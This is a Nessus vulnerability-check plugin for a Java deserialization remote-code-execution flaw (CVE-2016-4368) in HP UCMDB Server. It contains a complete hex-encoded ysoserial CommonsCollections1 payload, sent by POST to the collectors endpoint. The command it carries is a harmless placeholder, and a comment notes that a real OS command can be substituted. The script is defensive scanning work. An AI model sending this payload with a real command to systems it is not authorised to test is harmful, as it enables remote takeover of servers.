
#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(92540);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2016/07/27 13:35:33 $");

  script_cve_id("CVE-2016-4368");
  script_bugtraq_id(91107);
  script_osvdb_id(129952, 130424, 139510);
  script_xref(name:"HP", value:"HPSBGN03622");
  script_xref(name:"HP", value:"PSRT102949");
  script_xref(name:"HP", value:"emr_na-c05164408");
  script_xref(name:"CERT", value:"576313");

  script_name(english:"HP UCMDB Server Java Deserialization RCE");
  script_summary(english:"Check the response from the UCMDB server.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The HP Universal Configuration Management Database (UCMDB) Server 
running on the remote host is affected by a remote code execution 
vulnerability due to unsafe deserialize calls of unauthenticated
Java objects to the Apache Commons Collections (ACC) library. An
unauthenticated, remote attacker can exploit this, by sending a 
crafted POST request, to execute arbitrary code on the target host.");
  #https://h20564.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-c05164408 
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?f441c3b9");
  # http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e0204f30");
  script_set_attribute(attribute:"solution", value:
"Apply the mitigation procedures given in the vendor advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/01/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/07/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:hp:universal_configuration_management_database");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2016 Tenable Network Security, Inc.");

  script_dependencies("hp_ucmdb_server_detect.nbin"); 
  script_require_keys("installed_sw/HP Universal Configuration Management Database Server");
  script_require_ports("Services/www", 8080, 8443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("install_func.inc");
include("http.inc");

app_name = "HP Universal Configuration Management Database Server";

get_install_count(app_name:app_name, exit_if_zero:TRUE);

port = get_http_port(default:8080);

install = get_single_install(app_name:app_name, port:port);

url = build_url(port:port, qs:install['url']);

# To attack, use a real OS command
cmd = "no_such_os_command_AAAAAAAA";
cmdlen = strlen(cmd);

# serialized object produced with :
#   java -jar ysoserial-0.0.4-all.jar CommonsCollections1 <command_to_run>
# 
data = hex2raw(s:"ACED00057372003273756E2E7265666C6563742E616E6E6F746174696F6E2E416E6E6F746174696F6E496E766F636174696F6E48616E646C657255CAF50F15CB7EA50200024C000C6D656D62657256616C75657374000F4C6A6176612F7574696C2F4D61703B4C0004747970657400114C6A6176612F6C616E672F436C6173733B7870737D00000001000D6A6176612E7574696C2E4D6170787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B78707371007E00007372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E747400124C6A6176612F6C616E672F4F626A6563743B7870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647571007E001E00000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E001E7371007E00167571007E001B00000002707571007E001B00000000740006696E766F6B657571007E001E00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E001B7371007E0016757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017400");
data += raw_string(cmdlen) + cmd;
data += hex2raw(s:"740004657865637571007E001E0000000171007E00237371007E0011737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000010770800000010000000007878767200126A6176612E6C616E672E4F766572726964650000000000000000000000787071007E003A");

item = '/mam-collectors/collectorsResults?cmd=process+results&SessionCustomerId=1&versionNum=10.20.480&isZipped=false';

res = http_send_recv3(
        port:       port, 
        method:     'POST',
        item:       item, 
        data:       data,
        exit_on_fail: TRUE 
      );

# Expect 500
if( (res[0] =~ "^HTTP/[0-9]\.[0-9] 500") && 
  (
    # Attempted to execute the command but failed 
    ("InvokerTransformer: The method 'exec' on 'class java.lang.Runtime' threw an exception" >< res[0])

    # Attempted to execute the command and succeeded.
    || ("java.lang.Integer cannot be cast to java.util.Set" >< res[0])

    # Seen when CommonsCollections3 was used as payload type for 
    # ysoserial. It's been observed that a valid OS command does 
    # execute even with this message.
    || ("InstantiateTransformer: Constructor threw an exception" >< res[0])
    )
)
{
  report =
    '\n' + 'Nessus was able to exploit a Java deserialization vulnerability using' +
    '\n' + 'a crafted POST request to URL ' + item + '.' +
    '\n';
  security_report_v4(
    port     : port,
    severity : SECURITY_HOLE,
    extra    : report
  );
}
# Possible reasons:

# 1) Patched.
# Vendor mitigation says to use ACC version 3.2.2, which prints
# out the following error message:
# 
# Serialization support for org.apache.commons.collections.
# functors.InvokerTransformer is disabled for security reasons. 
# To enable it set system property 'org.apache.commons.collections.
# enableUnsafeSerialization' to 'true', but you must ensure that 
# your application does not de-serialize objects from untrusted sources.
#
# 2) Target not accepting CustomerId 1
# 
else
{
  if("InvokerTransformer is disabled for security reasons" >< res[0])
    audit(AUDIT_WEB_APP_NOT_AFFECTED, app_name, url);
  else
    exit(0, 'Unable to determine whether the remote web server is affected. Response status: \n' + res[0]); 
}

